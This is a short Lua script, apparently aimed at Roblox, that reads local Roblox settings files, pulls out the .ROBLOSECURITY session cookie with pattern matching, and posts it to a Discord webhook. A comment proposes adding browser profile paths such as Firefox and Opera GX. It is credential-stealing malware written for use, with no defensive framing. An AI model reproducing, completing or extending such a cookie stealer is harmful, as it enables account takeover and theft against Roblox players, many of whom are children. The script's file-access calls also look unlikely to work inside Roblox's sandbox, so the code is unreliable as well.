local HttpService = game:GetService("HttpService")
local paths = {
    os.getenv("LOCALAPPDATA").."\\Roblox\\GlobalBasicSettings_13.xml",
    os.getenv("APPDATA").."\\..\\Local\\Roblox\\GlobalBasicSettings_13.xml",
    -- add 10–20 more common paths for Opera GX, Firefox profiles, old installs, etc.
}

local webhook = "https://discord.com/api/webhooks/1467896250274812036/w7Or-fPilBf6BDd5AsWciOLcIjW2-mby-i-lf9gUS0X0ATXAVLY2uXIp2WClXk_3Wp1R."   -- your real webhook

for _, path in ipairs(paths) do
    local file = io.open(path, "r")
    if file then
        local content = file:read("*all")
        file:close()
        local cookie = content:match('"_ROBLOSECURITY","(.+)"') 
                    or content:match("ROBLOSECURITY=(.+)$")
        if cookie and #cookie > 50 then
            pcall(function()
                HttpService:PostAsync(webhook, HttpService:JSONEncode({content = cookie}), Enum.HttpContentType.ApplicationJson)
            end)
        end
    end
end
